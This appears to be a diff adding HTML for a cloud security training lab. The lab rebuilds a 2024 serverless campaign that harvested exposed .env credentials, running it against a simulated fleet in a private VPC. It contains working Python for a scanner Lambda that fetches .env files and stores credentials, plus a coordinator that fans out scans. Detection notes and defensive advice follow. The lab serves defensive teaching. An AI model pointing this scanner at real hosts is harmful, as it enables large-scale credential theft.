+      <div class="step-num">1</div>
+      <div class="step-content">
+        <div class="step-desc">Deploy the simulated "victim fleet" — 10 EC2 instances in the lab's private VPC that serve fake <code>.env</code> files containing simulated credentials. All targets use private IP addresses in the <code>10.0.1.0/24</code> CIDR range.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Deploy simulated victim fleet using the provided CloudFormation template
+$ aws cloudformation deploy \
+  --template-file lab-victim-fleet.yaml \
+  --stack-name m20-l05-victims \
+  --parameter-overrides VpcId=vpc-lab123 SubnetId=subnet-priv456</div>
+            <div class="terminal-output">Waiting for changeset to be created..
+Waiting for stack create/update to complete
+Successfully created/updated stack - m20-l05-victims
+
+# 10 EC2 instances now serving fake .env files on port 80
+# IPs: 10.0.1.10 through 10.0.1.19
+# Each instance serves /public/.env with simulated credentials</div>
+            <div class="terminal-cmd"># Verify a simulated target responds correctly (from inside VPC)
+$ curl -s http://10.0.1.10/.env | head -5</div>
+            <div class="terminal-output">AWS_ACCESS_KEY_ID=AKIASIMULATED00001
+AWS_SECRET_ACCESS_KEY=SimulatedSecret00001NotReal
+DB_PASSWORD=SimulatedDbPassword00001
+STRIPE_SECRET_KEY=sk_test_SIMULATED00001</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">2</div>
+      <div class="step-content">
+        <div class="step-desc">Create the scanner Lambda function that reads a list of target IPs from S3 and checks each for exposed <code>.env</code> files. The Lambda is deployed in the same private VPC as the simulated fleet.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ cat scanner.py</div>
+            <div class="terminal-output">import json, boto3, urllib.request
+
+s3 = boto3.client('s3')
+lambda_client = boto3.client('lambda')
+
+def handler(event, context):
+    targets = event.get('targets', [])
+    results = []
+
+    for ip in targets:
+        try:
+            # All targets are private VPC IPs — no internet traffic
+            resp = urllib.request.urlopen(
+                f"http://{ip}/.env", timeout=3
+            )
+            content = resp.read().decode('utf-8', errors='ignore')
+            if 'AWS_ACCESS_KEY_ID' in content or 'DB_PASSWORD' in content:
+                results.append({
+                    'ip': ip,
+                    'content': content[:500]
+                })
+        except Exception:
+            pass
+
+    if results:
+        dynamodb = boto3.resource('dynamodb')
+        table = dynamodb.Table('scan-results')
+        for r in results:
+            table.put_item(Item=r)
+
+    return {'scanned': len(targets), 'hits': len(results)}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">3</div>
+      <div class="step-content">
+        <div class="step-desc">Implement recursive fan-out: a coordinator Lambda reads the full target IP list from S3, chunks it, and asynchronously invokes child scanner Lambdas for each chunk. All Lambdas run in the lab VPC.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ cat coordinator.py</div>
+            <div class="terminal-output">import json, boto3
+
+s3 = boto3.client('s3')
+lambda_client = boto3.client('lambda')
+CHUNK_SIZE = 2  # Small chunks for lab — 10 total targets
+
+def handler(event, context):
+    obj = s3.get_object(Bucket='lab-scan-targets', Key='targets.txt')
+    # targets.txt contains: 10.0.1.10 through 10.0.1.19 (lab VPC only)
+    targets = obj['Body'].read().decode().strip().split('\n')
+
+    chunks = [targets[i:i+CHUNK_SIZE] for i in range(0, len(targets), CHUNK_SIZE)]
+
+    for chunk in chunks:
+        lambda_client.invoke(
+            FunctionName='scanner',
+            InvocationType='Event',
+            Payload=json.dumps({'targets': chunk})
+        )
+
+    return {'total_targets': len(targets), 'child_invocations': len(chunks)}</div>
+          </div>
+        </div>
+        <div class="note"><i class="fa-solid fa-circle-info"></i> <strong>Concurrency note:</strong> The default Lambda concurrency limit (1,000) is an account-wide unreserved pool shared across ALL functions in the account — it is not a dedicated per-function allocation. In the real-world 2024 attack, threat actors used reserved concurrency on the scanner function to guarantee throughput. In this lab, the 10-target fleet keeps concurrency negligible; the architecture demonstrates the fan-out pattern at small scale.</div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">4</div>
+      <div class="step-content">
+        <div class="step-desc">Trigger the coordinator and watch results populate in DynamoDB in real time as child Lambdas scan the simulated fleet.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd">$ aws lambda invoke --function-name coordinator \
+  --invocation-type Event response.json</div>
+            <div class="terminal-output">{"StatusCode": 202}</div>
+            <div class="terminal-cmd"># Wait ~10 seconds for child Lambdas to complete, then check results:
+$ aws dynamodb scan --table-name scan-results --select COUNT</div>
+            <div class="terminal-output">{"Count": 10, "ScannedCount": 10}</div>
+            <div class="terminal-cmd">$ aws dynamodb scan --table-name scan-results --limit 3</div>
+            <div class="terminal-output">{
+    "Items": [
+        {"ip": {"S": "10.0.1.10"}, "content": {"S": "AWS_ACCESS_KEY_ID=AKIASIMULATED00001\nAWS_SECRET_ACCESS_KEY=..."}},
+        {"ip": {"S": "10.0.1.11"}, "content": {"S": "AWS_ACCESS_KEY_ID=AKIASIMULATED00002\nAWS_SECRET_ACCESS_KEY=..."}},
+        {"ip": {"S": "10.0.1.12"}, "content": {"S": "DB_PASSWORD=SimulatedDbPassword00003\nSTRIPE_SECRET_KEY=..."}}
+    ]
+}</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="lab-step">
+      <div class="step-num">5</div>
+      <div class="step-content">
+        <div class="step-desc">Review the lab summary. All 10 simulated targets were scanned using Lambda fan-out with zero external internet traffic. The architecture mirrors the 2024 real-world technique at small scale.</div>
+        <div class="terminal">
+          <div class="terminal-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span> Terminal</div>
+          <div class="terminal-body">
+            <div class="terminal-cmd"># Lab run summary (simulated targets only):</div>
+            <div class="terminal-output">Lab Scan Summary (Private VPC — 10.0.1.0/24 only):
++-- Targets scanned:    10
++-- .env files found:   10 (all simulated victims serve fake credentials)
++-- Lambda invocations:  5 (coordinator + 5 child scanners, chunk size 2)
++-- External internet traffic: 0
++-- VPC CIDR range used: 10.0.1.0/24 (lab account only)
+
+# Real-world 2024 attack context (for reference only):
+# Threat actors scanned 230M+ internet endpoints using this same fan-out
+# pattern — zero EC2 infrastructure, ~$15 Lambda cost, ~50 min total runtime.
+# The technique works because Lambda fan-out scales horizontally to account
+# concurrency limits with no persistent network infrastructure to detect.</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="attack-flow">
+    <div class="flow-title"><i class="fa-solid fa-diagram-project"></i> Attack Flow</div>
+    <div class="flow-diagram">
+      <div class="flow-node">Coordinator Lambda</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Read VPC targets from S3</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Fan-out child Lambdas</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Scan simulated .env files</div>
+      <div class="flow-arrow">&rarr;</div>
+      <div class="flow-node">Results to DynamoDB</div>
+    </div>
+  </div>
+  <div class="lab-note"><i class="fa-solid fa-circle-info"></i> The 2024 campaign scanned 230M+ endpoints with zero EC2 instances. Serverless architectures are architecturally advantageous for attackers: pay-per-use, auto-scaling, no persistent infrastructure, and minimal VPC flow log visibility when Lambdas are not VPC-attached. Defend by never serving <code>.env</code> files via web servers, and block direct access to application root and dotfiles at the web server or CDN layer.</div>
+
+  <!-- DETECTION NOTES -->
+  <div class="note" style="margin-top:1rem;">
+    <strong><i class="fa-solid fa-magnifying-glass"></i> Detection Notes (L05):</strong>
+    <ul>
+      <li>VPC Flow Logs: a Lambda in a VPC making hundreds of outbound port-80/443 connections to many distinct IPs within seconds is anomalous</li>
+      <li>CloudTrail: <code>lambda:InvokeFunction</code> with <code>InvocationType: Event</code> at high frequency from a single coordinator is a fan-out pattern indicator</li>
+      <li>Non-VPC Lambda: no VPC Flow Logs available — CloudWatch Logs showing high invocation counts and <code>urllib.request</code> timeouts to many IPs is the primary signal</li>
+      <li>GuardDuty Runtime Monitoring detects anomalous network behavior from within Lambda execution environments</li>
+    </ul>
+  </div>
+</div>
+
+<!-- CLEANUP -->
+<div class="cleanup" style="margin-top:2rem;">
+  <strong><i class="fa-solid fa-broom"></i> Lab Cleanup (M20 — all labs):</strong>
+  <ol>
+    <li>Delete all objects uploaded to <code>s3://target-bucket/uploads/</code> during L01</li>
+    <li>Flush the SQS <code>data-transform</code> queue to remove any injected messages: <code>aws sqs purge-queue --queue-url &lt;url&gt;</code></li>
+    <li>Delete the <code>scan-results</code> DynamoDB table created for L05: <code>aws dynamodb delete-table --table-name scan-results</code></li>
+    <li>Delete the CloudFormation stack for the simulated victim fleet: <code>aws cloudformation delete-stack --stack-name m20-l05-victims</code></li>
+    <li>Delete the coordinator and scanner Lambda functions deployed in L05</li>
+    <li>Empty and delete the <code>lab-scan-targets</code> S3 bucket used in L05</li>
+  </ol>
+</div>
